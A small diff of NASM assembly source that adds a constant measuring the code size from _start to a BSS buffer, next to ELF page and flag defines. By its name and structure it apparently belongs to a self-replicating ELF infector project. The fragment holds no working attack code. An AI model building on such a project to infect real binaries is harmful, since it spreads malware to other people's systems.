@@ -18,6 +18,7 @@
 %define PF_R            4
 %define PAGE_SIZE       0x1000
 %define FAMINE_SIZE end_addr - _start
+%define FAMINE_SIZE_NO_BSS buffer_bss - _start
 
 ; STRUCTURES
 ; https://gist.github.com/x0nu11byt3/bcb35c3de461e5fb66173071a2379779
